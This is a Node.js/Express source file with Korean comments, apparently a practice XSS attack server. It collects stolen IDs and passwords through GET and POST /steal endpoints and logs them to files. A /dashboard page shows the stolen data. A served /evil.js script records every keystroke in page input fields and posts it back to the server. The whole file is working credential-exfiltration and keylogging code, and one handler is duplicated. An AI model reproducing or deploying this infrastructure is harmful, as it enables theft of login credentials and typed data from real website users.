const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const app = express();

// CORS 허용 (모든 도메인에서 접근 가능)
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// 로그 파일 설정
const logFile = 'stolen_credentials.txt';

// 1. GET 방식으로 크레덴셜 수집
app.get('/steal', (req, res) => {
    const { id, pw } = req.query;
    const timestamp = new Date().toISOString();
    const ip = req.ip || req.connection.remoteAddress;
    
    const logEntry = `
========================================
[${timestamp}]
IP: ${ip}
ID: ${id}
Password: ${pw}
User-Agent: ${req.headers['user-agent']}
========================================\n`;
    
    // 파일에 저장
    fs.appendFileSync(logFile, logEntry);
    
    // 콘솔에 출력
    console.log('\n🎯 새로운 크레덴셜 탈취!');
    console.log('ID:', id);
    console.log('PW:', pw);
    console.log('IP:', ip);
    
    // 응답 (CORS 방지)
    res.send('OK');
});
// d연습
// idpw.js 수정
app.get('/steal', (req, res) => {
    const { id, pw } = req.query;
    const timestamp = new Date().toISOString();
    const ip = req.ip || req.connection.remoteAddress;
    
    const logEntry = `
========================================
[${timestamp}]
IP: ${ip}
ID: ${id}
Password: ${pw}
User-Agent: ${req.headers['user-agent']}
========================================\n`;
    
    fs.appendFileSync(logFile, logEntry);
    
    console.log('\n🎯 새로운 크레덴셜 탈취!');
    console.log('ID:', id);
    console.log('PW:', pw);
    console.log('IP:', ip);
    
    // 1x1 투명 이미지 응답 (중요!)
    const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.writeHead(200, {
        'Content-Type': 'image/gif',
        'Content-Length': pixel.length,
        'Access-Control-Allow-Origin': '*'
    });
    res.end(pixel);
});

// 2. POST 방식으로도 받기
app.post('/steal', (req, res) => {
    const { id, pw } = req.body;
    const timestamp = new Date().toISOString();
    
    const logEntry = {
        timestamp,
        credentials: { id, pw },
        headers: req.headers
    };
    
    // JSON 파일로도 저장
    fs.appendFileSync('stolen_data.json', JSON.stringify(logEntry) + '\n');
    
    console.log('📥 POST 데이터 수신:', { id, pw });
    res.json({ status: 'success' });
});

// 3. 실시간 모니터링 대시보드
app.get('/dashboard', (req, res) => {
    const logs = fs.existsSync(logFile) ? fs.readFileSync(logFile, 'utf8') : 'No data yet';
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>XSS Attack Dashboard</title>
            <style>
                body {
                    background: #1a1a1a;
                    color: #0f0;
                    font-family: monospace;
                    padding: 20px;
                }
                h1 { color: #f00; }
                .log-entry {
                    background: #000;
                    border: 1px solid #0f0;
                    padding: 10px;
                    margin: 10px 0;
                    white-space: pre-wrap;
                }
                .refresh {
                    background: #0f0;
                    color: #000;
                    padding: 10px 20px;
                    border: none;
                    cursor: pointer;
                }
            </style>
        </head>
        <body>
            <h1>🎯 XSS Attack Dashboard</h1>
            <button class="refresh" onclick="location.reload()">새로고침</button>
            <div class="log-entry">${logs}</div>
            <script>
                // 5초마다 자동 새로고침
                setTimeout(() => location.reload(), 5000);
            </script>
        </body>
        </html>
    `);
});

// 4. 테스트용 악성 스크립트 제공
app.get('/evil.js', (req, res) => {
    res.type('application/javascript');
    res.send(`
        console.log('Evil script loaded!');
        // 모든 입력 필드 모니터링
        document.addEventListener('input', function(e) {
            fetch('${req.protocol}://${req.get('host')}/steal', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    field: e.target.name,
                    value: e.target.value
                })
            });
        });
    `);
});

const PORT = 3000;
app.listen(PORT, () => {
    console.log(`
    ╔════════════════════════════════════╗
    ║   🔥 XSS 공격 서버 실행 중 🔥      ║
    ║                                    ║
    ║   http://localhost:${PORT}         ║
    ║   Dashboard: /dashboard            ║
    ╚════════════════════════════════════╝
    `);
});
